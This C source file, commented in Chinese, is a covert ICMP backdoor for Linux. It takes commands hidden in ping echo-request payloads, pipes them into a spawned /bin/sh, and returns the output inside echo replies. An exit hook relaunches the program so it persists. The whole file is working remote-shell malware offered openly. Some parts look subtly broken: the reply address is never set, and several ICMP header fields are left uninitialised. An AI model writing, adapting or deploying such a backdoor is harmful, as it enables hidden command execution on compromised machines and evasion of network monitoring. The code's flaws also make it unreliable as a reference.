/*
运行在 Linux 上的服务端

来一个

icmp 的一个 replay 包 和 一个 request 包要对应啊 
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <sys/wait.h>

typedef unsigned int uint32;
typedef unsigned short uint16;
typedef unsigned char uint8;


#define dbg_msg(fmt,...) do{\
    printf(fmt,__VA_ARGS__); \
}while(0);

#define IN_BUF_SIZE   1024  //接收数据的缓冲区的大小 
#define OUT_BUF_SIZE  64

typedef struct _cmd_context
{
    char *cmd;//要执行的命令
    char *request;//请求包
    uint32 ip;
}cmd_context;

enum GlobalStatus
{
    STATUS_SHELL_START = 0x2B,
    STATUS_SHELL_EXIT,
    STATUS_PROCESS_EXITING
};

int  g_icmp_sock = 0;
int  g_CanThreadExit = 0; //线程是不是可以退出了。
int  read_pipe[2];  //读取的管道
int  write_pipe[2];
char *g_MyName = NULL;
uint32 g_RemoteIp = 0;// 远程 ip 
char *g_Cmd = NULL; //要执行的命令
char *g_Request = NULL;//请求的数据吧

/*
创建一个线程 
*/
pthread_t MyCreateThread(void *(*func)(void *),void *lparam)
{
    pthread_attr_t attr;
    pthread_t  p;
    pthread_attr_init(&attr);
    //pthread_attr_setdetachstate(&attr,PTHREAD_CREATE_DETACHED);
    if(0 == pthread_create(&p,&attr,func,lparam))
    {
        pthread_attr_destroy(&attr);
        return p;
    }
    dbg_msg("pthread_create() error: %s \n",strerror(errno));
    pthread_attr_destroy(&attr);
    return 0;
}

/*
计算 icmp 数据包的 校验和
*/
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte, rs;

    sum = 0;
    while(nbytes > 1) 
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if(nbytes == 1) 
    {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char  *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}

/*
发送 icmp  echo request 包
失败返回 -1
成功返回 0
*/
int  icmp_sendreplay(int icmp_sock, uint32 ip,uint8 *pdata,uint32 size)
{
    struct icmphdr *icmp;
    struct sockaddr_in addr;
    int nbytes;
    int ret = 1;

    icmp = (struct icmphdr *)malloc(sizeof(struct icmphdr) + size);
    if(NULL == icmp)
    {
        return -1;
    }
    icmp->type = 0;
    memcpy(icmp + 1,pdata,size);
    memset(&addr,0,sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip;
    
    icmp->checksum = 0x00; // echo replay 
    icmp->checksum = checksum((unsigned short *) icmp, sizeof(struct icmphdr) + size);

    // send reply
    nbytes = sendto(g_icmp_sock, icmp, sizeof(struct icmphdr) + size, 0, (struct sockaddr *) &addr, sizeof(addr));
    if (nbytes == -1) 
    {
        perror("sendto");
        ret = -1;
    }
    free(icmp);
    return ret;
}

/*
发送 数据 对 数据进行 压缩
*/
int SendData(unsigned char *pData,int Size)
{
    return icmp_sendreplay(g_icmp_sock,g_RemoteIp,pData,Size);
}

void set_fd_noblock(int fd)
{
    int flags;
    flags = fcntl(fd, F_GETFL, 0);
    flags |= O_NONBLOCK;
    fcntl(fd, F_SETFL, flags);
}

/*
接收命令的线程
*/
void *Icmp_RecvThread(void *lparam)
{
    char in_buf[IN_BUF_SIZE];
    struct iphdr *ip;
    struct icmphdr *icmp;
    char *data;
    int nbytes = 0;

    while(1) 
    {
        // read data from socket
        memset(in_buf, 0x00, IN_BUF_SIZE);
        nbytes = read(g_icmp_sock, in_buf, IN_BUF_SIZE - 1);
        if (nbytes > 0) 
        {
            // get ip and icmp header and data part
            ip = (struct iphdr *) in_buf;
            if (nbytes > sizeof(struct iphdr))
            {
                nbytes -= sizeof(struct iphdr);
                icmp = (struct icmphdr *) (ip + 1);
                if(8 == icmp->type)  //只接受 icmp request 请求的
                {
                    if (nbytes > sizeof(struct icmphdr))
                    {
                        nbytes -= sizeof(struct icmphdr);
                        data = (char *) (icmp + 1);  //得到 icmp 头 后面的数据 
                        data[nbytes] = '\0';
                        dbg_msg("%s:icmp recv %s  \n",__func__, data);
                        // 写到 shell 里面 
                        data[nbytes] = '\n';  //发来的命令 里面 应该 不能含有 \n
                        write(write_pipe[1],data,nbytes+1);
                        fflush(stdout);
                    }
                }
            }
        }
        if(-1 == nbytes)
        {
            dbg_msg("%s:read() error \n",__func__);
            perror("read() :");
            break;
        }
    }
    dbg_msg("%s: Thread exit ... \n",__func__);
    return NULL;
}


/*
从管道中读取数据（命令执行的结果）并发送出去 
*/
void *ShellPipe_ReadThread(void *lparam)
{
    unsigned char buff[512];
    int nBytes = 0;
    while((nBytes = read(read_pipe[0],&buff[0],510)) > 0)
    {
        dbg_msg("%s: recv %d bytes from pipe: %s \n",__func__,nBytes,buff);
        SendData(buff,nBytes);
    }
    dbg_msg("%s: thread exit ... \n",__func__);
    return NULL;
}

/*
退出的时候重新启动进程
*/
void OnExit()
{
    dbg_msg("%s:exiting 。。、\n",__func__);
    sleep(1);
    if(g_MyName)
        system(g_MyName); //重新启动进程
}

int main(int argc, char **argv)
{
    int pid;
    g_MyName = argv[0]; //保存下
    atexit(OnExit);
    // create raw ICMP socket
    g_icmp_sock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (g_icmp_sock == -1) 
    {
        perror("socket");
        return -1;
    }

    pipe(read_pipe);
    pipe(write_pipe);

    pid = fork();

    if(0 == pid)
    {
        //进入子进程
        //启动 shell 进程
        close(read_pipe[0]);
        close(write_pipe[1]);
        char *argv[] = {"/bin/sh",NULL};
        char *shell = "/bin/sh";
        dup2(write_pipe[0],STDIN_FILENO); //将输入输出重定向到管道
        dup2(read_pipe[1],STDOUT_FILENO);
        dup2(read_pipe[1],STDERR_FILENO);
        execv(shell,argv);  //启动 shell 
    }
    else
    {
        pthread_t hIcmpRecv;
        pthread_t hShellRead;
        close(read_pipe[1]);
        close(write_pipe[0]);
        dbg_msg("child process id %d \n",pid);
        //启动一个线程来读取
        hIcmpRecv = MyCreateThread(Icmp_RecvThread,NULL);
        hShellRead = MyCreateThread(ShellPipe_ReadThread,NULL);
        if(0 == hIcmpRecv || 0 == hShellRead)
        {
            dbg_msg("%s:Create Thread exit ... \n",__func__);
        }
        waitpid(pid,NULL,0);  //等待子进程退出
        close(read_pipe[0]);
        close(write_pipe[1]);
        pthread_join(hIcmpRecv,NULL);  //线程会因为上面的句柄关闭 而退出
        pthread_join(hShellRead,NULL);
        dbg_msg("%s:child exit. ..\n",__func__);
    }
    return 0;
}
